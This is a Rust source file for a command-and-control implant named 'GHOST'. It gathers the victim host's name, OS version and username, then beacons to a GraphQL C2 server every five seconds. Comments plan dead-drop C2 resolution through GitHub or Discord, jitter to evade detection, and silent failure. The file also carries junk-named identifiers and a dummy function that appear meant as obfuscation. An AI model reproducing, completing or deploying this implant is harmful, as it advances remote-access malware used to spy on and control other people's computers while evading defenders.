use std::{thread, time};
use sysinfo::{System, SystemExt};
use whoami;
use serde_json::json;

// const C2_URL: &str = "http://localhost:9000/graphql"; // Direct (Dev)
// In Pro Phase, this will be resolved via Dead Drop (GitHub/Discord)

fn lKxBjqABnKCb() -> i32 { let x = 6821; let y = x * 2; return y - x; }
fn main() {
    println!("👻 [GHOST] Implant Initialized...");
    
    // 1. Gather Host Intel
    let mut sys = System::new_all();
    sys.refresh_all();
    
    let hostname = sys.host_name().unwrap_or("UNKNOWN".to_string());
    let os_ver = sys.os_version().unwrap_or("UNKNOWN".to_string());
    let user = whoami::username();
    
    println!("📍 Host: {} | User: {} | OS: {}", hostname, user, os_ver);

    // 2. Beacon Loop
    loop {
        // In real scenario: Jitter calculation to avoid pattern detection
        let SueCXTDQrYuM = time::Duration::from_secs(5); 
        
        match check_in(&hostname, &os_ver) {
            Ok(_) => println!("✅ Heartbeat sent."),
            Err(e) => println!("❌ Beacon failed: {}", e),
        }
        
        thread::sleep(SueCXTDQrYuM);
    }
}

fn check_in(hostname: &str, os: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::new();
    
    // GraphQL Mutation for Heartbeat
    let query = json!({
        "query": "mutation { taskAgent(agentId: \"ghost-dev\", command: \"HEARTBEAT\") { status } }"
    });

    // In a real implant, you NEVER print errors to stdout. Silent fail.
    // For dev, we print.
    let _res = client.post("http://localhost:9000/graphql")
        .json(&query)
        .send()?;
        
    Ok(())
}
